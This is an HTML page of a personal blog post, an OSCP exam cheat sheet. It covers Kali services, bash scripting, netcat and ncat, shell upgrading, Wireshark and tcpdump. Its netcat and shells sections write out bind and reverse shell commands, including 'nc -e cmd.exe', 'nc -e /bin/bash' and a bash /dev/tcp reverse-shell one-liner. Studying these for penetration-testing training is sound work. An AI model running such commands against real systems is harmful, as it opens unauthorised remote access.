<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="map[name:Quac Tran]">
<meta name="description" content="This is all I have gathered from my practice and oscp exam. It is quite complete. Hope it will help your exam.
 Try Harder
 Finding Around Kali Find, Locate, and Which locate Reads from a database prepared by updatedb
updatedb
locate ssh.config
which Returns pathnames of files or links which would be executed in the current environment. It does this by searching the PATH variable.
which python
find  find / -name &#39;file*&#39; find / -name &#39;foldername&#39; -type d find / -name &#39;filename&#39; -type f find / -name &#39;sbd*&#39; -exec file {} \;  Managing Kali Linux Services The standard Kali services include ssh, http, sql, which by default would load at boot time, however Kali prevents this by not allowing that, and includes a management system to control their status." />
<meta name="keywords" content=", oscp, infosec" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://tranquac.github.io/posts/2021/04/oscp-cheatsheet-full/" />


    <title>
        
            OSCP CheatSheet Full :: Hi, I&#39;m Quac Tran 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://tranquac.github.io/main.c46cbca46fa76c0fcd3da8313ecf4adee5fb3ffb0288c0902d7e90aead220d79.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://tranquac.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://tranquac.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://tranquac.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://tranquac.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://tranquac.github.io/safari-pinned-tab.svg" color="#1b1c1d">
    <link rel="shortcut icon" href="https://tranquac.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="#1b1c1d">
    <meta name="theme-color" content="#1b1c1d">



<meta itemprop="name" content="OSCP CheatSheet Full">
<meta itemprop="description" content="This is all I have gathered from my practice and oscp exam. It is quite complete. Hope it will help your exam.
 Try Harder
 Finding Around Kali Find, Locate, and Which locate Reads from a database prepared by updatedb
updatedb
locate ssh.config
which Returns pathnames of files or links which would be executed in the current environment. It does this by searching the PATH variable.
which python
find  find / -name &#39;file*&#39; find / -name &#39;foldername&#39; -type d find / -name &#39;filename&#39; -type f find / -name &#39;sbd*&#39; -exec file {} \;  Managing Kali Linux Services The standard Kali services include ssh, http, sql, which by default would load at boot time, however Kali prevents this by not allowing that, and includes a management system to control their status."><meta itemprop="datePublished" content="2021-04-25T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2021-04-25T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="14288"><meta itemprop="image" content="https://pbs.twimg.com/profile_images/1390346481970802689/qMVDRriV_400x400.jpg"/>
<meta itemprop="keywords" content="oscp,infosec," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://pbs.twimg.com/profile_images/1390346481970802689/qMVDRriV_400x400.jpg"/>

<meta name="twitter:title" content="OSCP CheatSheet Full"/>
<meta name="twitter:description" content="This is all I have gathered from my practice and oscp exam. It is quite complete. Hope it will help your exam.
 Try Harder
 Finding Around Kali Find, Locate, and Which locate Reads from a database prepared by updatedb
updatedb
locate ssh.config
which Returns pathnames of files or links which would be executed in the current environment. It does this by searching the PATH variable.
which python
find  find / -name &#39;file*&#39; find / -name &#39;foldername&#39; -type d find / -name &#39;filename&#39; -type f find / -name &#39;sbd*&#39; -exec file {} \;  Managing Kali Linux Services The standard Kali services include ssh, http, sql, which by default would load at boot time, however Kali prevents this by not allowing that, and includes a management system to control their status."/>




    <meta property="og:title" content="OSCP CheatSheet Full" />
<meta property="og:description" content="This is all I have gathered from my practice and oscp exam. It is quite complete. Hope it will help your exam.
 Try Harder
 Finding Around Kali Find, Locate, and Which locate Reads from a database prepared by updatedb
updatedb
locate ssh.config
which Returns pathnames of files or links which would be executed in the current environment. It does this by searching the PATH variable.
which python
find  find / -name &#39;file*&#39; find / -name &#39;foldername&#39; -type d find / -name &#39;filename&#39; -type f find / -name &#39;sbd*&#39; -exec file {} \;  Managing Kali Linux Services The standard Kali services include ssh, http, sql, which by default would load at boot time, however Kali prevents this by not allowing that, and includes a management system to control their status." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tranquac.github.io/posts/2021/04/oscp-cheatsheet-full/" /><meta property="og:image" content="https://pbs.twimg.com/profile_images/1390346481970802689/qMVDRriV_400x400.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-04-25T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-04-25T00:00:00&#43;00:00" />
<meta property="og:see_also" content="https://tranquac.github.io/posts/2021/04/getting-the-oscp-certification-offensive-security-certified-professional-pen-200-review/" />





    <meta property="article:section" content="oscp" />

    <meta property="article:section" content="infosec" />



    <meta property="article:published_time" content="2021-04-25 00:00:00 &#43;0000 UTC" />








    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://tranquac.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">Security ramblings</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://tranquac.github.io/about/">About</a></li><li><a href="https://tranquac.github.io/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        68 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://tranquac.github.io/posts/2021/04/oscp-cheatsheet-full/">OSCP CheatSheet Full</a>
      </h1>

      

      

      

      <div class="post-content">
        <p>This is all I have gathered from my practice and oscp exam. It is quite complete. Hope it will help your exam.</p>
<blockquote>
<p>Try Harder</p>
</blockquote>
<h2 id="finding-around-kali">Finding Around Kali</h2>
<h3 id="find-locate-and-which">Find, Locate, and Which</h3>
<h4 id="locate">locate</h4>
<p>Reads from a database prepared by <code>updatedb</code></p>
<p><code>updatedb</code><br>
<code>locate ssh.config</code></p>
<h4 id="which">which</h4>
<p>Returns pathnames of files or links which would be executed in the current environment. It does this by searching the PATH variable.</p>
<p><code>which python</code></p>
<h4 id="find">find</h4>
<ul>
<li><code>find / -name 'file*'</code></li>
<li><code>find / -name 'foldername' -type d</code></li>
<li><code>find / -name 'filename' -type f</code></li>
<li><code>find / -name 'sbd*' -exec file {} \;</code></li>
</ul>
<h2 id="managing-kali-linux-services">Managing Kali Linux Services</h2>
<p>The standard Kali services include ssh, http, sql, which by default would load at boot time, however Kali prevents this by not allowing that, and includes a management system to control their status. Before starting any services, change root password with <code>passwd</code>.</p>
<h3 id="ssh-service">SSH Service</h3>
<p>Port 22</p>
<p><code>service ssh start</code><br>
<code>netstat -tulpn | grep sshd</code><br>
<code>service ssh stop</code><br>
<code>netstat -tulpn | grep sshd</code></p>
<h3 id="http-service">HTTP Service</h3>
<p>Port 80</p>
<p><code>service apache2 start</code><br>
<code>service nginx start</code></p>
<p>Default Apache document root is at <code>/var/www/html</code></p>
<p>To change the index page content, <code>echo &quot;Try harder!&quot; &gt; /var/www/html/index.html</code></p>
<p><code>service apache2 stop</code><br>
<code>service nginx stop</code></p>
<h3 id="service-management">Service Management</h3>
<p><code>service</code> is a wrapper around existing system init scripts located in <code>/etc/init.d/</code> directory. Another way of managing the service, you can directly use the init scripts.</p>
<ul>
<li><code>/etc/init.d/ssh start</code></li>
<li><code>/etc/init.d/ssh stop</code></li>
</ul>
<h3 id="service-boot-persistence">Service Boot Persistence</h3>
<p>Services will be started at boot time.</p>
<ul>
<li><code>update-rc.d ssh enable</code> or <code>systemctl enable ssh</code></li>
<li><code>update-rc.d ssh disable</code> or <code>systemctl disable ssh</code></li>
</ul>
<p>For more granular control of these services, use <code>rcconf</code> or <code>sysv-rc-conf</code>, both to help simplify and manage the boot persistence of these services.</p>
<h2 id="the-bash-environment">The Bash Environment</h2>
<h3 id="intro-to-bash-scripting">Intro to Bash Scripting</h3>
<h4 id="syntax-basic">Syntax basic</h4>
<p>Shebang<br>
<code>#!/bin/bash</code></p>
<p>Bind Variable<br>
<code>user1 = $(whoami)</code><br>
<code>name = &quot;Quac Tran&quot;</code><br>
<code>number = 1</code></p>
<p>If, Else, Elif Statements</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> &lt;some test&gt; <span style="color:#f92672">]</span>
<span style="color:#66d9ef">then</span>
    &lt;perform an action&gt;
<span style="color:#66d9ef">else</span>
    &lt;perform another action&gt;
<span style="color:#66d9ef">fi</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> &lt;some test&gt; <span style="color:#f92672">]</span>
<span style="color:#66d9ef">then</span>
    &lt;perform an action&gt;
<span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> &lt;some test&gt; <span style="color:#f92672">]</span>
<span style="color:#66d9ef">then</span>
    &lt;perform different action&gt;
<span style="color:#66d9ef">else</span>
    &lt;perform yet another different action&gt;
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>For loop</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">for</span> var-name in &lt;list&gt;
<span style="color:#66d9ef">do</span>
    &lt;action to perform&gt;
<span style="color:#66d9ef">done</span>
</code></pre></div><p>Example: <code>for ip in $(seq 1 10); do echo 10.11.1.$ip; done hay for i in {1..10}; do echo 10.11.1.$i;done</code></p>
<p>While loop</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> &lt;some test&gt; <span style="color:#f92672">]</span>
<span style="color:#66d9ef">do</span>
    &lt;perform an action&gt;
<span style="color:#66d9ef">done</span>
</code></pre></div><p>Function</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">print_me<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
    echo <span style="color:#e6db74">&#34;Try harder!&#34;</span>
<span style="color:#f92672">}</span>
print_me
</code></pre></div><h4 id="practical-bash-usage--example-1">Practical Bash Usage – Example 1</h4>
<blockquote>
<p>Files: cisco.sh</p>
</blockquote>
<p>Find all of cisco.com&rsquo;s subdomains on their homepage and find their IPs.</p>
<h5 id="method-1">Method 1</h5>
<p><code>curl -s https://www.cisco.com | grep 'href=' | cut -d'/' -f3 | grep 'cisco.com' | cut -d'&quot;' -f1 | sort -u &gt; test</code></p>
<ul>
<li><code>curl https://www.cisco.com</code> - Download cisco.com and output to stdout, silent, hide progress</li>
<li><code>grep 'href='</code> - Grep all lines with href links</li>
<li><code>cut -d'/' -f3</code> - Splits lines by slashes and take field number 3 (eg. Field 3 of &hellip;href=&ldquo;<a href="http://hello.cisco.com/%22..">http://hello.cisco.com/&quot;..</a>. will be hello.cisco.com)</li>
<li><code>grep 'cisco.com'</code> - Filter out lines with cisco.com as the domain</li>
<li><code>cut -d'&quot;' -f1</code> - Filter out lines that have trailing quotes</li>
<li><code>sort -u</code> - Sort and remove all duplicates with <code>-u</code> (unique). Compared to <code>uniq</code>, <code>uniq</code> removes duplicates that are adjacent to each other, eg. a a b a -&gt; a b a</li>
</ul>
<h5 id="method-2">Method 2</h5>
<p><code>curl -s https://www.cisco.com | grep -o '[A-Za-z0-9\._-]*\.*cisco\.com' | sort -u</code></p>
<ul>
<li><code>curl -s https://www.cisco.com</code> - Download cisco.com and output to stdout, silent, hide progress</li>
<li><code>grep -o '[A-Za-z0-9\._-]*\.*cisco\.com'</code>
<ul>
<li><code>-o</code> - Output only the matching pattern</li>
<li><code>[A-Za-z0-9\._-]*</code> - Match 0 or more alphanumeric character, including &ldquo;.&rdquo;, &ldquo;_&rdquo; and &ldquo;-&rdquo;</li>
<li><code>\.</code> - URL dot</li>
<li><code>*</code> - Non-regex, grep wildcard in this case, to match domains that end with cisco.com (eg. static-static.com)</li>
<li><code>\.com</code> - URL top level domain</li>
</ul>
</li>
<li><code>sort -u</code> - Sort and remove all duplicates with <code>-u</code> (unique)</li>
</ul>
<h5 id="other-methods">Other Methods</h5>
<ul>
<li><code>curl https://www.cisco.com | grep -o -P '[\w\._-]+\.[\w\._-]*cisco\.com' | sort -u</code> - Equivalent to method 2</li>
<li><code>curl https://www.cisco.com | grep -o -E '\w+\.cisco\.com' | sort -u </code> - Shortcut, less accurate as it doesn&rsquo;t match &ldquo;<a href="http://www.static-cisco.com">www.static-cisco.com</a>&rdquo;</li>
<li><code>wget -q -O - https://www.cisco.com | ...</code> - Wget instead of curl, quiet, and output to stdout</li>
</ul>
<h5 id="final">Final</h5>
<p><code>for url in $(curl -s https://www.cisco.com | grep -o '[A-Za-z0-9\._-]*\.*cisco\.com' | sort -u); do host $url | grep 'has address' | cut -d' ' -f4; done</code></p>
<h4 id="practical-bash-usage--example-2">Practical Bash Usage – Example 2</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cat access_log.txt | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f1 | sort | uniq -c | sort -urn | head
cat access_log.txt | grep <span style="color:#e6db74">&#39;208.68.234.99&#39;</span> | cut -d<span style="color:#e6db74">&#39;&#34;&#39;</span> -f2 | sort | uniq -c | sort -urn | head
cat access_log.txt | grep <span style="color:#e6db74">&#39;208.68.234.99&#39;</span> | grep <span style="color:#e6db74">&#39;/admin&#39;</span> | sort | uniq -c
<span style="color:#75715e"># cat access_log.txt | grep &#39;208.68.234.99&#39; | grep &#39;/admin&#39; | awk &#39;{print $9}&#39; | sort | uniq -c</span>
</code></pre></div><h3 id="data-manipulation-tools-summary">Data Manipulation Tools Summary</h3>
<h4 id="cut"><code>cut</code></h4>
<ul>
<li><code>-d</code> - Delimiter</li>
<li><code>-f</code> - Field number
<ul>
<li><code>-f4</code> - Field 4</li>
<li><code>-f1,4</code> - Field 1 and 4</li>
<li><code>-f2-5</code> - Fields 2 to 5</li>
<li><code>-f-7</code> - Fields 1 to 7</li>
<li><code>-f3-</code> - Fields 3 and beyond</li>
</ul>
</li>
</ul>
<h4 id="sort-and-uniq"><code>sort</code> and <code>uniq</code></h4>
<ul>
<li><code>sort -u</code> - Sort and remove all duplicates (unique)</li>
<li><code>uniq</code> - Remove duplicates adjacent to each other</li>
<li><code>uniq -c</code> - Remove duplicates adjacent to each other and count</li>
<li><code>uniq -u</code> - Show unique items only (rarely use)</li>
<li><code>sort | uniq -c | sort -urn</code> - Count occurence and sort them from most common to least</li>
</ul>
<h4 id="grep"><code>grep</code></h4>
<ul>
<li><code>grep [pattern]</code> - Print lines only with matching pattern, can handle regular regex, no <code>+</code>, no shorthands, <code>*</code> on its own means grep wildcard</li>
<li><code>grep -arni [pattern]</code> - Process binaries as text, recursive, line prefixed, ignore case</li>
<li><code>grep -arni [pattern] --include \*.md</code> - Process binaries as text, recursive, line prefixed, ignore case, and only from markdown files</li>
<li><code>grep -E [pattern]</code> - Extended regex, <code>+</code>, shorthands, but cannot put shorthands in brackets</li>
<li><code>grep -P [pattern]</code> - Perl/Python regex, <code>+</code>, shorthands, can put shorthands in brackets</li>
</ul>
<p>Windows counterpart of <code>grep</code> is <code>find</code>, eg. <code>netstat -na | find &quot;4444&quot;</code></p>
<h4 id="tr"><code>tr</code></h4>
<ul>
<li><code>medusa -d | grep \+ | cut -d' ' -f6 | cut -d. -f1 | tr '\n' ' '</code> - Translates/substitutes all line breaks with commas, converting multiple lines into a single line separated with spaces</li>
</ul>
<h4 id="for"><code>for</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">IFS<span style="color:#f92672">=</span><span style="color:#e6db74">$&#39;\n&#39;</span> <span style="color:#75715e"># if the list file has spaces, the for loop will split it, so you shud use internal field separator</span>
<span style="color:#66d9ef">for</span> ip in <span style="color:#66d9ef">$(</span>cat list<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
  echo <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><h1 id="the-essential-tools">The Essential Tools</h1>
<h2 id="netcatnc">Netcat/<code>nc</code></h2>
<h3 id="connecting-to-a-tcpudp-port">Connecting to a TCP/UDP Port</h3>
<p><code>nc -nv [ip] [port]</code> - <code>-n</code> means do no resolve hostname, <code>-v</code> more verbose</p>
<p>Start Mercury mail server on Win 7 machine.</p>
<ul>
<li>25 - SMTP</li>
<li>110 - POP3</li>
<li>143 - IMAP</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$nc -nv 192.168.1.23 <span style="color:#ae81ff">25</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">25</span> <span style="color:#f92672">(</span>smtp<span style="color:#f92672">)</span> open
<span style="color:#ae81ff">220</span> localhost ESMTP server ready.
HELP
214-Recognized SMTP commands are:
214-   HELO   EHLO   MAIL   RCPT   DATA   RSET
214-   AUTH   NOOP   QUIT   HELP   VRFY   SOML
<span style="color:#ae81ff">214</span> Mail server account is <span style="color:#e6db74">&#39;Maiser&#39;</span>.
^C
$nc -nv 192.168.1.23 <span style="color:#ae81ff">110</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">110</span> <span style="color:#f92672">(</span>pop3<span style="color:#f92672">)</span> open
+OK &lt;87219363.8932@localhost&gt;, POP3 server ready.
^C
$nc -nv 192.168.1.23 <span style="color:#ae81ff">110</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">110</span> <span style="color:#f92672">(</span>pop3<span style="color:#f92672">)</span> open
+OK &lt;87253870.12354@localhost&gt;, POP3 server ready.
USER bob
+OK bob is known here.
PASS bob
-ERR Username or password is invalid or incorrect.
QUIT
+OK localhost Server closing down.
$nc -nv 192.168.1.23 <span style="color:#ae81ff">143</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">143</span> <span style="color:#f92672">(</span>imap2<span style="color:#f92672">)</span> open
* OK localhost IMAP4rev1 Mercury/32 v4.52 server ready.
^C
$
</code></pre></div><h3 id="listening-on-a-tcpudp-port">Listening on a TCP/UDP Port</h3>
<p>On Win 7, move nc.exe to C:\Windows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\O</span>ffsec&gt;nc -nlvp <span style="color:#ae81ff">4444</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span>
connect to <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> from &lt;UNKNOWN&gt; <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">59460</span>
hi
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
$nc -nv 192.168.1.23 <span style="color:#ae81ff">4444</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
hi
</code></pre></div><p>Win 7 is the server, <code>-nlvp 4444</code> no lookup listening (server) verbose bound to port 4444. Kali is the client connecting to it on port 4444 with <code>-nv</code>.</p>
<h3 id="transferring-files-with-netcat">Transferring Files with Netcat</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
nc -nlvp <span style="color:#ae81ff">446</span> &gt; incoming.exe
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
$nc -nv 192.168.1.23 <span style="color:#ae81ff">4446</span> &lt; /usr/share/windows-binaries/wget.exe
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">4446</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
$
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
incoming.exe -h
</code></pre></div><h3 id="remote-administration-with-netcat">Remote Administration with Netcat</h3>
<h4 id="2141---netcat-bind-shell-scenario">2.1.4.1 - Netcat Bind Shell Scenario</h4>
<p>Alice -&gt; Firewall -&gt; Public IP -&gt; Internet -&gt; Public IP -&gt; Bob</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
nc -lvp <span style="color:#ae81ff">4446</span> -e cmd.exe
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
nc -nv 192.168.1.23 <span style="color:#ae81ff">4446</span>

C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\O</span>ffsec&gt;ipconfig
...
</code></pre></div><h4 id="2142---reverse-shell-scenario">2.1.4.2 - Reverse Shell Scenario</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
nc -nlvp <span style="color:#ae81ff">4446</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
nc -nv 192.168.1.23 <span style="color:#ae81ff">4446</span> -e /bin/bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
whoami
root
</code></pre></div><h4 id="netcat-as-a-port-monitor">Netcat as a Port Monitor</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">watch -n1 nc -w1 -nvz 192.168.1.23 <span style="color:#ae81ff">123</span>
<span style="color:#75715e"># -w1: timeout 1 sec, -n: no reverse lookup, -v: verbose, -z: no IO, act as a scanner</span>
</code></pre></div><h2 id="ncat"><code>ncat</code></h2>
<p>Reverse Shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
ncat -lnvp <span style="color:#ae81ff">4444</span> --allow <span style="color:#f92672">[</span>win ip<span style="color:#f92672">]</span> --ssl
<span style="color:#75715e"># Win</span>
ncat -nv <span style="color:#f92672">[</span>kali ip<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> -e cmd.exe --ssl
</code></pre></div><p>Bind Shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win</span>
ncat -lnvp <span style="color:#ae81ff">4444</span> -e cmd.exe --allow <span style="color:#f92672">[</span>kali ip<span style="color:#f92672">]</span> --ssl
<span style="color:#75715e"># Kali</span>
ncat -nv <span style="color:#f92672">[</span>win ip<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> --ssl
</code></pre></div><p>The <code>ncat</code> in the Windows VM produces many errors, even after updating. To update, download &ldquo;nmap-7.60-win32.zip&rdquo; and reinstall the nmap suite, which includes the latest version of ncat. Be warned, errors will still occur.</p>
<h2 id="shells-reference">Shells Reference</h2>
<p>Upgrade a half shell to full interactive shell on a compromised Linux machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># On victim</span>
python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
Ctrl-z
<span style="color:#75715e"># On attacker</span>
echo $TERM <span style="color:#75715e"># note down</span>
stty -a <span style="color:#75715e"># note down rows and cols</span>
stty raw -echo <span style="color:#75715e"># this may be enough</span>
fg
<span style="color:#75715e"># On victim</span>
reset
export SHELL<span style="color:#f92672">=</span>bash
export TERM<span style="color:#f92672">=</span>xterm256-color
stty rows <span style="color:#ae81ff">38</span> columns <span style="color:#ae81ff">116</span>
</code></pre></div><p>Resources:</p>
<ul>
<li>Upgrade to full interactive shell: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></li>
<li>Reverse Shell Cheatsheet: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>
<ul>
<li><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></li>
</ul>
</li>
</ul>
<p>Note: Netcat (<code>nc</code>) OpenBSD does not support <code>-e</code>. Netcat versions: GNU, OpenBSD, Traditional, Netcat6</p>
<h2 id="wireshark">Wireshark</h2>
<p>Network -&gt; Capture Filters -&gt; Capture Engine -&gt; Display Filters</p>
<p>Capture filters are very useful as they can selectively capture packets that match a certain criteria. The capture filter syntax is different from the usual display filter syntax. An example would be <code>host 8.8.8.8 and tcp port 80</code>, to capture packets that involve 8.8.8.8 and tcp port 80 only. Display filters on the other hand does not affect the packet capturing process, it just applies a filter to already captured packets, example <code>tcp.port == 80</code>. If you notice, wireshark capture filters are the same as tcpdump capture filters.</p>
<p>Capture filters can be specified in Capture &gt; Options &gt; Capture filter for selected interface, or in Capture &gt; Capture Filters</p>
<p>Follow TCP stream is very useful as in can display the client and server communication in formatted plaintext. It works on web traffic, nc connections (shells, mail, unencrypted connections), etc.</p>
<p>Typical web connection traffic:</p>
<ol>
<li>ARP broadcast looking for the default gateway</li>
<li>ARP unicast reply providing the MAC address of the gateway</li>
<li>DNS A (IPv4) forward lookup query</li>
<li>DNS AAAA (IPv6) forward lookup query</li>
<li>DNS A response received</li>
<li>DNS AAAA response received</li>
<li>3-way handshake on port 80</li>
<li>Initial protocol negotiation in HTTP GET request</li>
</ol>
<h2 id="tcpdump"><code>tcpdump</code></h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">tcpdump -r password_cracking_filtered.pcap | awk <span style="color:#e6db74">&#39;{print $3}&#39;</span> | cut -d. -f-4 | sort | uniq -c | sort -urn  <span style="color:#75715e"># Show most common IPs</span>
tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap <span style="color:#75715e"># Filter by src host</span>
tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap <span style="color:#75715e"># Filter by dst host</span>
tcpdump -n port <span style="color:#ae81ff">81</span> -r password_cracking_filtered.pcap <span style="color:#75715e"># Filter by port</span>
tcpdump -nXr password_cracking_filtered.pcap <span style="color:#75715e"># Hex</span>
